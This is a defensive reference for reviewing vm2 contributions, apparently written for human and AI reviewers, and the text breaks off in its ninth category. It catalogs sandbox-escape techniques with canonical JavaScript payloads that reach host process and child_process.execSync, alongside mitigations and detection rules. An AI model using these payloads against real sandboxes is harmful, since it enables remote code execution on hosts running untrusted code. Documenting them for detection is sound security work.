# Sandbox Escape Attack Patterns

This document catalogs known attack patterns used to circumvent the vm2 sandbox. It is intended for AI agents and reviewers evaluating new code contributions. Each section describes a category of attack, provides canonical examples, explains why it is dangerous, and lists detection heuristics for spotting similar patterns in contributed code.

---

## How to Use This Document

When reviewing a code contribution:

1. Check if any code (including test fixtures, examples, or "utility" helpers) matches the patterns below.
2. Pay special attention to code that accesses `.constructor`, `__proto__`, `Symbol.species`, `Proxy`, `Reflect`, or overrides built-in prototype methods.
3. Any code that attempts to obtain a reference to host-realm `Function`, `process`, `require`, or `child_process` from within sandbox context is an escape attempt.
4. The ultimate goal of almost every escape is: get a reference to the host `Function` constructor, then call `Function("return process")()` to access Node.js `process` and from there `require("child_process").execSync(...)`.

---

## Fundamentals

Before diving into specific attack categories, it is essential to understand the architectural constraints that make sandbox escapes possible and the design choices that shape the defense surface.

### Realm Separation

vm2 runs untrusted code inside a V8 context created by Node.js's `vm` module. Host and sandbox share the **same V8 isolate** -- they execute on the same thread, in the same heap. The sandbox gets its own set of global intrinsics (`Object`, `Function`, `Array`, `Error`, etc.), but these are all allocated from the same memory space as the host's intrinsics. There is no process boundary, no memory isolation, and no privilege separation at the OS level. If an attacker obtains a reference to any host-realm constructor, they can evaluate arbitrary code in the host context.

A "host-realm object" is any object whose prototype chain leads to the host's intrinsics. A "sandbox-realm object" leads to the sandbox's intrinsics. The bridge's job is to ensure that sandbox code never sees a host-realm object directly -- only proxied wrappers that sanitize every property access.

### The Bridge Proxy Model

`lib/bridge.js` is the core of vm2. It maintains two WeakMaps:

- **`mappingThisToOther`**: maps host objects to their sandbox proxy wrappers (and vice versa, depending on which side loaded the bridge).
- **`mappingOtherToThis`**: maps sandbox proxies back to the host objects they wrap.

When a host object crosses into the sandbox, `thisFromOther(other)` looks it up in `mappingThisToOther`. If already wrapped, the existing proxy is returned (identity preservation). If new, a proxy is created whose traps sanitize every property access, method call, and prototype traversal.

The **proxy invariant problem**: proxies preserve object identity (the same host object always maps to the same sandbox proxy), but every trap is an attack surface. Each trap must correctly handle attacker-controlled inputs, V8 internal algorithm invocations, and edge cases like non-configurable properties. The bridge is essentially a manually-written membrane, and any gap in the membrane is a potential escape.

### V8 Internal Algorithms vs JS-Level Code

This is the **root cause** of most attacks in this document. V8 implements many specification algorithms in C++ (ArraySpeciesCreate, FormatStackTrace, PromiseResolveThenableJob, etc.). These C++ algorithms operate on raw object pointers, **bypassing proxy traps entirely** in many cases. When V8's C++ code reads `obj.constructor` for species resolution, it reads the actual property on the underlying object -- not the proxy's `get` trap return value. When V8's stack formatter calls `Error.toString()`, it runs in whatever realm created the error.

This means: **any defense that relies solely on proxy traps is incomplete**. The bridge must also neutralize the raw objects themselves (e.g., setting `constructor = undefined` directly on host arrays) and control V8-level hooks (e.g., `Error.prepareStackTrace`).

### The Transformer's Role

`lib/transformer.js` uses Acorn to parse sandbox code and instrument it:

- **`catch` blocks**: Wrapped so that `handleException(e)` is called on every caught value. This sanitizes host-realm errors that V8 might throw (e.g., TypeError from type coercion failures).
- **`with` statements**: Instrumented to prevent scope chain manipulation.

`handleException` (defined in `lib/setup-sandbox.js`) calls `ensureThis` on the caught value, which walks the prototype chain and converts host objects to sandbox proxies. It also detects `SuppressedError` instances and recursively sanitizes their `.error` and `.suppressed` properties.

**Critical limitation**: The transformer uses Acorn with `ecmaVersion: 2022`. Syntax introduced after ES2022 -- notably `using` declarations (ES2024) -- is invisible to the transformer. Code using `using` inside `eval()` bypasses catch-block instrumentation entirely.

### The Error Generation Primitive

A pattern that appears in nearly every compound attack:

```javascript
const e = new Error();
e.name = Symbol();  // Symbol cannot be converted to string
e.stack;            // V8's C++ FormatStackTrace calls e.toString() -> TypeError
```

When V8 formats a stack trace, its C++ code calls `Error.prototype.toString()`, which concatenates `this.name + ": " + this.message`. If `name` is a `Symbol`, the string concatenation throws a `TypeError`. Depending on where this TypeError is caught, it may be a **host-realm** error (if the formatting happened in host-side code like `prepareStackTraceCallback`) or a sandbox-realm error (if the sandbox's `prepareStackTrace` handled it). This primitive generates host errors on demand and is referenced throughout this document.

### The `isHost` Asymmetry

The bridge is loaded in both the host and the sandbox, but the security requirement is asymmetric: **only the sandbox side needs protection from leaking host objects**. The host side freely receives sandbox objects (they cannot harm the host). This means the bridge's proxy traps are primarily defensive on the sandbox-facing side: the `get` trap blocks dangerous constructors, the `ownKeys` trap filters dangerous symbols, the `apply` trap neutralizes species attacks, etc.

### The Escape Chain

Almost every escape follows this progression:

```
Sandbox Object
  -> Host Constructor (Function)
    -> Code Evaluation ("return process")
      -> process.mainModule.require
        -> require("child_process")
          -> execSync("arbitrary command")
```

Block **any** step in this chain, and the escape fails. The bridge blocks step 1 (constructor access). The transformer blocks catch-clause access. Promise sanitization blocks async paths to step 2. Defense in depth means multiple layers must be bypassed for a successful escape.

---

# Tier 1 -- Primitives

These are atomic building blocks that appear in nearly every exploit. Each primitive provides one piece of the escape chain.

---

## Attack Category 1: Constructor Chain Traversal

### Description

Every object in JavaScript has a `.constructor` property pointing to the function that created it. By walking up the constructor chain (`obj.constructor.constructor`), an attacker can reach the `Function` constructor of the host realm, which can evaluate arbitrary code outside the sandbox.

### Attack Flow

1. Obtain any host-realm object (via bridge-exposed built-in, error, or prototype traversal).
2. Access `.constructor` to get the object's constructor function.
3. Access `.constructor` again to get `Function` (since every function's constructor is `Function`).
4. Call `Function("return process")()` to get the host `process` object.
5. `process.mainModule.require("child_process").execSync(...)` for RCE.

### Canonical Examples

```javascript
// Direct global constructor chain
const HostFunction = this.constructor.constructor;
const process = HostFunction("return process")();

// Via __proto__
const process = global.__proto__.constructor.constructor("return this")()
  .constructor.constructor("return process")();

// Via an error object in catch
try { undefinedFunction(); }
catch (e) {
  const HostFunction = e.constructor.constructor;
  const process = HostFunction("return process")();
}
```

### Why It Works

The sandbox shares the same V8 isolate as the host. If constructors are not intercepted, the prototype chain eventually reaches the host realm's `Function`, which can compile and run code in the host context.

### Mitigation

The bridge's `get` trap intercepts `.constructor` access on proxied objects and returns `{}` (an empty object) for dangerous function constructors (Function, AsyncFunction, GeneratorFunction, AsyncGeneratorFunction). The `isThisDangerousFunctionConstructor` check blocks both this-realm and other-realm Function constructors.

### Detection Rules

- **Any access to `.constructor.constructor`** on any object is suspicious.
- **`Function("return process")()`** or equivalent string-to-code patterns.
- **`e.constructor`** inside a `catch` block where `e` is an error -- the error might carry host prototype references.
- **`global.constructor`**, `this.constructor`, or any object's `.constructor` followed by invocation with a string argument.

---

## Attack Category 2: Prototype Chain Manipulation

### Description

Attackers modify or traverse the prototype chain to access host objects or pollute shared prototypes to intercept security-critical operations.

### Attack Flow

1. Traverse `__proto__` chains to reach host-realm prototypes.
2. Alternatively, pollute `Object.prototype` with getter/setter traps that intercept bridge-internal property access.
3. When the bridge copies property descriptors or checks types, the polluted prototype injects attacker code.

### Canonical Examples

```javascript
// Climbing via __proto__
const hostObject = obj.__proto__.__proto__;

// Prototype pollution to intercept property descriptors
Object.defineProperty(Object.prototype, "get", {
  get() {
    throw f => f.constructor("return process")();
  }
});

// Setting prototype to bypass instanceof checks
Object.setPrototypeOf(promise, {});

// __defineGetter__ on prototypes
Buffer.prototype.__defineGetter__("toString", () => {});
```

### Why It Works

Prototype pollution can intercept property descriptor operations that the bridge uses internally. If an attacker can define a `get` or `set` trap on `Object.prototype`, they can hijack the bridge's own property copying logic. Additionally, `__proto__` traversal can reach host-realm prototypes that were not properly proxied.

### Mitigation

The bridge uses null-prototype objects (`{__proto__: null}`) for all internal descriptor operations. `__proto__` access is intercepted by the proxy `get` trap and returns the sandbox-side prototype. The bridge caches all critical `Reflect.*` methods at initialization, preventing monkey-patching.

### Detection Rules

- **`Object.defineProperty(Object.prototype, ...)`** -- polluting the root prototype.
- **`__defineGetter__`** or **`__defineSetter__`** on any prototype object.
- **`Object.setPrototypeOf`** or **`Reflect.setPrototypeOf`** -- changing prototype chains.
- **`__proto__` access or assignment** -- direct prototype manipulation.
- **`__lookupGetter__`** or **`__lookupSetter__`** -- accessing internal getter/setter references.

---

## Attack Category 3: Symbol-Based Attacks

### Description

JavaScript Symbols provide special protocol hooks (`Symbol.species`, `Symbol.hasInstance`, `Symbol.iterator`, etc.) that can override fundamental behaviors. Attackers use these to bypass type checks or redirect object construction. See also [Category 10: Array Species Self-Return](#attack-category-10-array-species-self-return-via-constructor-manipulation) for a concrete exploitation of `Symbol.species`.

### Attack Flow

1. Identify a V8 internal algorithm that reads a well-known symbol (e.g., `Symbol.species` for promise/array construction, `Symbol.hasInstance` for `instanceof` checks).
2. Override the symbol on a target object to redirect the algorithm's behavior.
3. The redirected behavior causes V8 to pass unsanitized host values to attacker-controlled code.

### Canonical Examples

```javascript
// Symbol.hasInstance to bypass instanceof
Object.__defineGetter__(Symbol.hasInstance, () => () => true);
Buffer.from.constructor("return process")();

// Symbol.hasInstance override to bypass resetPromiseSpecies guard
const GP = Object.getPrototypeOf(Promise); // gets globalPromise
Object.defineProperty(GP, Symbol.hasInstance, {value: () => false});
// Now `p instanceof globalPromise` returns false, skipping species reset
const p = asyncFn();
p.constructor = { [Symbol.species]: MaliciousPromise };
p.then(); // resetPromiseSpecies skipped due to instanceof bypass

// Symbol.species to redirect Promise construction
const p = asyncFn();
p.constructor = {
  [Symbol.species]: class FakePromise {
    constructor(executor) {
      executor(x => x, err => {
        // err might be unsanitized host error
        const HostFunction = err.constructor.constructor;
        HostFunction("return process")();
      });
    }
  }
};
p.then();

// Symbol.species getter TOCTOU -- returns safe value on first read, malicious on second
const p = asyncFn();
p.constructor = {
  get [Symbol.species]() {
    if (first) { first = false; return Promise; } // passes check
    return FakePromise; // V8 uses this for species resolution
  }
};
p.then();

// Error with Symbol name triggering host error path (see Fundamentals: Error Generation Primitive)
const error = new Error();
error.name = Symbol(); // toString() on Symbol throws TypeError
```

### Why It Works

`Symbol.species` controls what constructor is used when built-in methods create derived objects (e.g., `Promise.then` creates a new promise). If an attacker substitutes a custom class, that class's constructor receives host-realm values. `Symbol.hasInstance` controls `instanceof` checks that the bridge might rely on for type verification.

### Mitigation

`globalPromise` and `globalPromise.prototype` are frozen in `setup-sandbox.js`, preventing `Symbol.hasInstance` and `Symbol.species` overrides. Promise species is reset unconditionally via `Reflect.defineProperty` (data property, not accessor) before every `.then()`/`.catch()` call, eliminating TOCTOU. For arrays, `neutralizeArraySpecies` sets `constructor = undefined` on host arrays before/after host function calls.

### Detection Rules

- **`Symbol.species`** usage, especially assignment to `.constructor[Symbol.species]`.
- **`Symbol.species` as a getter** -- TOCTOU attack returning different values on each access.
- **`Symbol.hasInstance`** override via `__defineGetter__` or `Object.defineProperty`.
- **`Object.getPrototypeOf(Promise)`** -- accessing `globalPromise` to override its `Symbol.hasInstance`.
- **`Symbol.for()`** -- can create cross-realm shared symbols.
- **Any Symbol used as `error.name`** -- triggers `TypeError` on string conversion which may leak host errors.
- **`Symbol.iterator`** or **`Symbol.toPrimitive`** overrides -- can execute code during iteration or coercion.
- **Extraction of real symbols from host objects** -- see also [Category 8: Cross-Realm Symbol Extraction](#attack-category-8-cross-realm-symbol-extraction-from-host-objects).

---

## Attack Category 4: Error Object Exploitation

### Description

Errors carry stack traces, constructor references, and can trigger special V8 APIs. Attackers use errors as vehicles to access host-realm objects. The Error Generation Primitive (see Fundamentals) is the most common technique: setting `error.name = Symbol()` forces a host TypeError during V8's C++ stack formatting.

### Attack Flow

1. Create an error and manipulate it (e.g., set `name` to a Symbol, or override `prepareStackTrace`).
2. Access `.stack` to trigger V8's stack formatting, which may throw a host-realm TypeError.
3. Catch the TypeError (via catch block, promise rejection, or SuppressedError) to obtain a host-realm error object.
4. Traverse the host error's constructor chain to reach host `Function`.

### Canonical Examples

```javascript
// Error.prepareStackTrace to access CallSite objects
Error.prepareStackTrace = (err, callSites) => {
  return callSites.map(cs => cs.getThis()).find(x => x);
};
const { stack } = new Error();
// stack now contains host objects

// Stack overflow to trigger host error constructor
function recurse() { new Error().stack; recurse(); }
try { recurse(); }
catch (e) {
  // e is host RangeError with host constructor
  e.constructor.constructor("return process")();
}

// Error in Promise rejection path (uses Error Generation Primitive)
async function fn() {
  const e = new Error();
  e.name = Symbol(); // Forces host TypeError during string conversion
  return e.stack;
}
fn().catch(hostError => {
  hostError.constructor.constructor("return process")();
});
```

### Why It Works

V8's `Error.prepareStackTrace` API provides access to CallSite objects that reference the actual `this` value of each stack frame. Stack overflow errors are created by the engine itself and may carry host-realm prototypes. The Error Generation Primitive (`e.name = Symbol(); e.stack`) forces V8's C++ code to throw a TypeError during string formatting; if this happens in host-side code (like `prepareStackTraceCallback`), the TypeError is a host-realm error.

### Mitigation

`Error.prepareStackTrace` is always set to a safe `defaultSandboxPrepareStackTrace` function in `setup-sandbox.js` that handles Symbol names, Proxy objects, and other exotic types without throwing. When user code sets `Error.prepareStackTrace = undefined`, the setter resets to the safe default instead of allowing `undefined` (which would trigger V8's fallback to the host's `prepareStackTraceCallback`). CallSite `getThis()` is sanitized. `SuppressedError` is also added to `errorsList` in `bridge.js`.

### Detection Rules

- **`Error.prepareStackTrace`** assignment -- accessing V8 stack internals.
- **Recursive functions designed to cause stack overflow** -- intentional `RangeError` creation.
- **`error.name = Symbol()`** -- forces TypeError during string coercion (Error Generation Primitive).
- **Accessing `.stack` property on errors** in conjunction with prepareStackTrace.
- **Errors with unusual prototype manipulation** before throwing.
- **`Error.cause`** -- set by user code (not V8 internals), so `ensureThis` handles it; but worth noting as a potential carrier of host references.

---

## Attack Category 5: Function Caller/Callee Access

### Description

The `arguments.callee.caller` chain and function `caller`/`arguments` properties can leak references to functions higher in the call stack, potentially including bridge internals.

### Attack Flow

1. Define a function in the sandbox that accesses `arguments.callee.caller` or `fn.caller`.
2. Arrange for this function to be called by a bridge function (e.g., as a callback passed to a host API).
3. `.caller` returns the bridge function, whose `.constructor` is the host `Function`.

### Canonical Examples

```javascript
// arguments.callee.caller
(function() {
  return arguments.callee.caller;
})();

// Function.caller
function exploit() {
  return exploit.caller.constructor;
}

// arguments access on wrapped functions
function f() {
  return f.arguments[0]; // Might be host object
}
```

### Why It Works

If a sandbox function is called by a bridge function (host-realm), accessing `.caller` on the sandbox function returns the bridge function, which has a host-realm `constructor` (the host `Function`).

### Mitigation

The bridge throws immediately on `.caller` and `.arguments` access.

### Detection Rules

- **`arguments.callee`** -- accessing the calling function.
- **`arguments.callee.caller`** -- walking up the call stack.
- **`.caller` property** on any function.
- **`.arguments` property** on any function (the deprecated property, not the local `arguments` object).

---

# Tier 2 -- Techniques

These are mechanisms for delivering primitives. Each technique provides a way to trigger, amplify, or chain the Tier 1 primitives into actual escapes.

---

## Attack Category 6: Proxy Trap Exploitation

### Description

The `Proxy` constructor allows intercepting fundamental operations on objects. Attackers create Proxies with trap handlers that execute when the bridge processes values, allowing them to inject code at points where the bridge may pass unsanitized references. See also [Category 2: Prototype Chain Manipulation](#attack-category-2-prototype-chain-manipulation) for combining proxy traps with prototype pollution.

### Attack Flow

1. Create a Proxy with a trap handler (e.g., `getOwnPropertyDescriptor`, `getPrototypeOf`, `construct`).
2. Pass the Proxy to a host function (e.g., `Buffer.from()`) that the bridge will inspect.
3. When the bridge inspects the Proxy's properties, the trap executes.
4. The trap either throws a function (which receives host references as arguments in the catch block) or modifies `Object.prototype` to inject further traps.

### Canonical Examples

```javascript
// Throw function from getOwnPropertyDescriptor trap
Buffer.from(new Proxy({}, {
  getOwnPropertyDescriptor() {
    throw f => f.constructor("return process")();
  }
}));

// getPrototypeOf trap to pollute Object.prototype
Object.defineProperty(Buffer.from(""), "y", {
  value: new Proxy({}, {
    getPrototypeOf(target) {
      Object.defineProperty(Object.prototype, "get", {
        get() {
          throw f => f.constructor("return process")();
        }
      });
      return Object.getPrototypeOf(target);
    }
  })
});

// Construct trap returning a function
new Proxy(class A {}, {
  construct() {
    return function() {
      return Object.getPrototypeOf(this).constructor.constructor("return process")();
    };
  }
});

// instanceof bypass via getPrototypeOf
throw new Proxy({}, {
  getPrototypeOf: () => {
    throw x => x.constructor.constructor("return process")();
  }
});
```

### Why It Works

The bridge must inspect and copy properties of objects that cross the boundary. If those objects are Proxies, the trap handlers execute in a context where unsanitized host references might be available as arguments.

### Mitigation

The bridge wraps the Proxy constructor to sanitize handler objects. Proxy handlers inherit from null-prototype objects to prevent `Object.prototype` pollution from affecting trap resolution. `Proxy.revocable` is also considered: revocation creates errors in the realm where the proxy was created, so it does not introduce cross-realm errors.

### Detection Rules

- **`new Proxy(...)`** with trap handlers, especially: `getPrototypeOf`, `getOwnPropertyDescriptor`, `has`, `get`, `set`, `apply`, `construct`.
- **Throwing from within a Proxy trap** -- the thrown value might be a function that receives host references.
- **Proxy traps that modify `Object.prototype`** -- combining proxy exploitation with prototype pollution.
- **Proxy as argument to host functions** like `Buffer.from()`, where the bridge will inspect the proxy's properties.
- **`Proxy.revocable`** -- revocation creates TypeError in the proxy's realm; not directly exploitable but worth monitoring.

---

## Attack Category 7: Promise and Async Exploitation

### Description

Promises and async functions create deferred execution paths where callbacks may be invoked with values that haven't been properly sanitized by the bridge. The internal mechanics of Promise resolution can be exploited. This category combines [Category 3: Symbol-Based Attacks](#attack-category-3-symbol-based-attacks) (species) with async error paths.

### Attack Flow

1. Obtain a promise (from an async function, `Promise.resolve()`, or a host API).
2. Set `promise.constructor` to an object with `Symbol.species` pointing to a malicious class.
3. Call `.then()` which triggers V8's species resolution, creating a new promise via the malicious class.
4. The malicious class's executor receives unsanitized host errors.

Alternatively:
1. Steal a Promise static method (`FakePromise.all = Promise.all`).
2. Call it so `this` is `FakePromise`, which V8 uses as the constructor for the result promise.
3. Trigger an error during the operation (iteration error, callback error).
4. The unsanitized error goes to `FakePromise`'s reject handler.

### Canonical Examples

```javascript
// Override Function.prototype.call to intercept Promise internals
const origCall = Function.prototype.call;
Function.prototype.call = function(...args) {
  captured.push(this);
  return origCall.apply(this, args);
};
Promise.resolve().then(() => {});

// Symbol.species + Promise.then to get unsanitized rejection
const p = Promise.resolve();
p.constructor = { [Symbol.species]: FakePromise };
p.then(null, hostErr => {
  hostErr.constructor.constructor("return process")();
});

// Constructor getter TOCTOU -- accessor returns safe value to pass check,
// malicious value when V8 reads it for species resolution
async function fn() {
  const e = new Error();
  e.name = Symbol();
  return e.stack;
}
let first = true;
const p = fn();
Object.defineProperty(p, 'constructor', {get(){
  if (first) {first = false; return Promise;} // passes resetPromiseSpecies check
  return {[Symbol.species]: class FakePromise {
    constructor(executor) {
      executor(
        (x) => x,
        (err) => { err.constructor.constructor('return process')(); }
      )
    }
  }};
}});
p.then();

// Prototype-level constructor getter TOCTOU
const realProto = Object.getPrototypeOf(Promise.prototype); // globalPromise.prototype
let first = true;
Object.defineProperty(realProto, 'constructor', {configurable: true, get(){
  if (first) {first = false; return Promise;}
  return {[Symbol.species]: FakePromise};
}});
const p = fn();
p.then(); // own-property check sees nothing, prototype getter exploited

// Static method stealing -- multiple Promise static methods are vulnerable
function FakePromise(executor) {
  executor(
    (x) => x,
    (err) => { err.constructor.constructor('return process')(); }
  )
}

// Promise.all/race/any/allSettled -- vulnerable via iteration errors
FakePromise.all = Promise.all;
FakePromise.resolve = () => {};
FakePromise.all({[Symbol.iterator]: () => {
  const e = new Error();
  e.name = Symbol();
  return e.stack;
}});

// Promise.try (ES2024) -- vulnerable via callback errors
FakePromise.t = Promise.try;
FakePromise.t(() => {
  const e = new Error();
  e.name = Symbol();
  return e.stack;
});

// Reflect.construct instanceof bypass
function FakePromise(executor) {
  executor(
    (x) => x,
    (err) => { err.constructor.constructor('return process')(); }
  )
}
FakePromise[Symbol.species] = FakePromise;
const res = Reflect.construct(Promise, [()=>{
  const e = new Error();
  e.name = Symbol();
  return e.stack;
}], FakePromise);
res.then = Promise.prototype.then;
res.then();
// resetPromiseSpecies used 'instanceof globalPromise' which returned false

// Override Object.defineProperty to prevent species reset
Object.defineProperty = () => {};
async function fn() { /* trigger host error */ }
fn().then(() => {}, unsanitizedErr => { /* escape */ });

// Object.freeze to prevent species cleanup
p.constructor = Object.freeze({
  [Symbol.species]: MaliciousPromise
});
```

### Why It Works

Promise resolution invokes callbacks asynchronously. If `Function.prototype.call` is overridden, the bridge's internal calls to `.call()` on callbacks can be intercepted. If `Symbol.species` is set to a custom class, the new promise's executor receives unsanitized host values.

The TOCTOU (Time-Of-Check-Time-Of-Use) variants exploit the gap between when the bridge reads `p.constructor` (to check if it's safe) and when V8 internally reads it (for species resolution). JavaScript accessor properties (getters) can return different values on each access, making any check-then-use pattern on a getter fundamentally unsafe. This applies at both the instance level and the prototype level.

The static method stealing variant exploits Promise static methods that use `this` as the constructor for the result promise. When an attacker copies these methods to a FakePromise constructor, the method uses FakePromise to create the result promise. If an error occurs during the operation, the unsanitized host error goes directly to FakePromise's reject handler.

Specifically vulnerable methods:
- **`Promise.all/race/any/allSettled`**: Catch errors during iteration and pass them to the result promise's reject handler.
- **`Promise.try`** (ES2024): Catches errors thrown by the callback inside V8's Promise executor.
- **`Promise.resolve`**: Catches errors during thenable resolution.

Methods that are NOT vulnerable:
- **`Promise.reject/withResolvers`**: Errors come from user code, not V8 internals.

### Mitigation

All Promise static methods (`.all`, `.race`, `.any`, `.allSettled`, `.resolve`, `.reject`, `.try`, `.withResolvers`) are wrapped to always use `localPromise` as constructor, ignoring `this`. Species is reset unconditionally via `Reflect.defineProperty` (data property, not accessor) before every `.then()`/`.catch()`, eliminating TOCTOU. `globalPromise` and `globalPromise.prototype` are frozen. The `Reflect.construct` instanceof bypass is blocked because `resetPromiseSpecies` sets constructor on any object, not just `instanceof globalPromise`.

### Detection Rules

- **Override of `Function.prototype.call`**, `.apply`, or `.bind` -- intercepting internal method dispatch.
- **`promise.constructor = { [Symbol.species]: ... }`** -- redirecting promise construction.
- **`Object.defineProperty(p, 'constructor', {get(){...}})`** -- constructor getter TOCTOU on instance.
- **`Object.defineProperty(Object.getPrototypeOf(Promise.prototype), 'constructor', ...)`** -- constructor getter TOCTOU via prototype.
- **`Object.getPrototypeOf(Promise)`** -- accessing `globalPromise` to override `Symbol.hasInstance`.
- **`Object.defineProperty = () => {}`** -- disabling bridge safety mechanisms.
- **`Object.freeze()` on objects with `Symbol.species`** -- preventing cleanup.
- **`FakeConstructor.all = Promise.all`** (or `.race`, `.any`, `.allSettled`, `.resolve`, `.try`) -- stealing Promise static methods.
- **`Reflect.construct(Promise, [...], FakeNewTarget)`** -- creates real Promise with `FakeNewTarget.prototype`, bypassing `instanceof` checks.
- **Async functions that deliberately trigger errors** during string conversion or property access.

---

## Attack Category 8: Cross-Realm Symbol Extraction from Host Objects

### Description

Even when `Symbol.for` is overridden to return sandbox-local symbols, the real cross-realm symbols still exist as property keys on host objects exposed to the sandbox (e.g., `Buffer.prototype`, `Error.prototype`). Attackers can extract these real symbols using reflection APIs and use them to define properties that Node.js internals will invoke in host context. This technique enables [Category 9: Proxy Handler Exposure](#attack-category-9-proxy-handler-exposure-via-utilinspect) by providing the real `nodejs.util.inspect.custom` symbol.

### Attack Flow

1. Use reflection APIs (`Object.getOwnPropertySymbols`, `Reflect.ownKeys`, `Object.getOwnPropertyDescriptors`, `Object.assign`, object spread) to enumerate symbol-keyed properties on host objects.
2. Filter for the target symbol by `.description` (e.g., `'nodejs.util.inspect.custom'`).
3. Define the real symbol on a sandbox object.
4. When Node.js internals encounter the object, they invoke the symbol-keyed method with host context.

### Canonical Examples

```javascript
// Extract real symbol via Object.getOwnPropertySymbols
const realInspect = Object.getOwnPropertySymbols(Buffer.prototype)
  .find(s => s.description === 'nodejs.util.inspect.custom');

// Extract via Reflect.ownKeys
const realInspect = Reflect.ownKeys(Buffer.prototype)
  .find(k => typeof k === 'symbol' && k.description === 'nodejs.util.inspect.custom');

// Extract via Object.getOwnPropertyDescriptors (bypasses ownKeys override)
const descs = Object.getOwnPropertyDescriptors(Buffer.prototype);
// descs has the real symbol as a key since getOwnPropertyDescriptors
// uses internal [[OwnPropertyKeys]], not the user-visible Reflect.ownKeys

// Leak symbol key via Object.assign to a Proxy target
const target = new Proxy({}, {
  set(t, key, val) {
    leaked = key; // key is the real cross-realm symbol
    return true;
  }
});
Object.assign(target, Buffer.prototype);

// Extract via spread operator on bridge proxy
const {...inspectDesc} = Buffer.prototype;
// Spread calls [[OwnPropertyKeys]] which invokes the proxy's ownKeys trap directly

// Once the real symbol is obtained, use it to escape
const obj = {};
obj[realInspect] = function() {
  return this.constructor.constructor("return process")();
};

// Advanced: Function.prototype.value pollution + WebAssembly.compileStreaming
const {...inspectDesc} = Buffer.prototype;
for (const k in inspectDesc) delete inspectDesc[k];
Function.prototype.value = (depth, opt, inspect) => {
  inspect.constructor('return process')().mainModule.require('child_process').execSync('...');
};
const obj = { valueOf: undefined, constructor: undefined };
Object.defineProperties(obj, inspectDesc);
WebAssembly.compileStreaming(obj).catch(() => {});
```

### Why It Works

`Symbol.for('nodejs.util.inspect.custom')` creates a cross-realm symbol shared between host and sandbox. Even when the sandbox's `Symbol.for` is overridden, the real symbol already exists as a property key on host objects that the bridge exposes.

### Subtlety: Internal [[OwnPropertyKeys]] vs User-Visible Reflect.ownKeys

Several built-in functions use the spec-level `[[OwnPropertyKeys]]` internal method rather than the user-visible `Reflect.ownKeys`. For **plain objects**, this means overriding `Reflect.ownKeys` or `Object.getOwnPropertySymbols` alone is insufficient:

- **`Object.getOwnPropertyDescriptors(obj)`** -- calls `[[OwnPropertyKeys]]` on `obj`.
- **`Object.assign(target, ...sources)`** -- calls `[[OwnPropertyKeys]]` on each source.
- **`Object.defineProperties(obj, props)`** -- calls `[[OwnPropertyKeys]]` on `props`.
- **Object spread `{...obj}`** -- calls `[[OwnPropertyKeys]]` on the source.

However, for **Proxy objects**, the internal `[[OwnPropertyKeys]]` **does** trigger the proxy's `ownKeys` trap. The bypass only applies when `Reflect.ownKeys` is overridden as a user-visible function on plain objects -- Proxy ownKeys traps are always invoked by the spec algorithm. The bridge proxy handler's `ownKeys` trap filters dangerous symbols directly, so bridge-proxied host objects are protected regardless of sandbox-side overrides.

### Mitigation

Multi-layer defense. **Sandbox side** (`setup-sandbox.js`): overrides `Symbol.for`, `Object.getOwnPropertySymbols`, `Reflect.ownKeys`, `Object.getOwnPropertyDescriptors`, `Object.assign` to filter or replace dangerous symbols with sandbox-local equivalents. **Bridge side** (`lib/bridge.js`): the `ownKeys`/`has`/`getOwnPropertyDescriptor`/`set`/`defineProperty` traps filter dangerous symbols at key-access sites. The sandbox-side defense can be bypassed if the attacker obtains a live reference to the host's unmodified `Object`/`Reflect` (via prototype walk + `__lookupGetter__` + `Buffer.apply`, via a leaked `handler.getPrototypeOf`, etc.) — so the bridge side is the ultimate enforcement layer.

**Bridge symbol-boundary filter (GHSA-47x8-96vw-5wg6, -qcp4-v2jj-fjx8, -f539-x546-3726)**: the `case 'symbol':` branches of the three primitive-value chokepoints `thisFromOtherWithFactory`, `thisEnsureThis`, and `thisFromOtherForThrow` now check `isDangerousCrossRealmSymbol(other)` when `!isHost` and return `undefined` for dangerous symbols. This is the single choke point through which every host-produced symbol primitive passes before reaching sandbox code — whether from a direct call result (apply trap), property read (get trap), iterator yield, descriptor getter, or throw value. Returning `undefined` (rather than a sandbox-local surrogate) is deliberate: `undefined` as a computed key coerces to the string `"undefined"`, so any subsequent attempt to register a handler via `obj[sym] = fn`, `{[sym]: fn}`, `Object.defineProperty(obj, sym, ...)`, or `Reflect.set(obj, sym, fn)` installs the key under the string `"undefined"` — which is never invoked by host internals as a custom-inspect/rejection protocol.

**Pre-wrap container scrub**: `apply` and `construct` traps invoke `stripDangerousSymbolsFromHostResult(ret)` on the raw host return value before wrapping. For host arrays, the scrub drops any element that is a dangerous symbol and compacts; for non-array host objects (such as the return value of `Object.getOwnPropertyDescriptors`), it deletes own-property slots keyed by the dangerous symbols. This closes iteration and descriptor-enumeration paths that would otherwise still see the dangerous symbol present on the host container.

**ownKeys trap rewrite**: iterates the raw host result via `otherReflectGet` rather than bridge-wrapping it, so dangerous symbols can be *dropped* (preserving the Proxy ownKeys invariant, which forbids `undefined` keys) rather than rewritten.

### Detection Rules

- **`Object.getOwnPropertySymbols(hostObject)`** -- enumerating symbols on bridge-exposed objects.
- **`Reflect.ownKeys(hostObject)`** -- same pattern via Reflect.
- **`.find(s => s.description === '...')`** -- searching for symbols by description string.
- **`Object.getOwnPropertyDescriptors(hostObject)`** -- extracting symbol-keyed descriptors.
- **`Object.assign(proxy, hostObject)`** -- leaking symbol keys via Proxy set trap.
- **`{...hostObject}`** or **`const {...x} = hostObject`** -- spread operator on bridge proxies.
- **`Array.prototype.splice = ...`** or other Array method overrides before symbol enumeration -- attempting to bypass array-based filtering.
- **`Function.prototype.value = ...`** -- prototype pollution to hijack `Object.defineProperties`.
- **`WebAssembly.compileStreaming(obj)`** -- triggers internal `util.inspect` on error.

---

## Attack Category 9: Proxy Handler Exposure via util.inspect

### Description

When Node.js's `util.inspect` is called with `showProxy: true`, it exposes the internal target and handler of Proxy objects. If proxy handlers store references to raw host objects in accessible locations, attackers can retrieve these references. This technique relies on [Category 8: Cross-Realm Symbol Extraction](#attack-category-8-cross-realm-symbol-extraction-from-host-objects) to obtain the real inspect symbol, and the handler methods become vectors for [Category 1: Constructor Chain Traversal](#attack-category-1-constructor-chain-traversal).

### Attack Flow

1. **Duck-typing exploit**: `Buffer.prototype.slice` internally calls `this.subarray(start, end)`. By setting `subarray` to `Buffer.prototype.inspect`, calling `slice` invokes `inspect` with attacker-controlled arguments.
2. **Inspect options access**: `Buffer.prototype.inspect` accepts inspect options including callbacks like `stylize`. Inside these callbacks, `this` refers to the internal inspect context.
3. **Handler exposure via showProxy**: When `showProxy: true` is set, the inspect context's `seen` array can contain proxy handler objects.
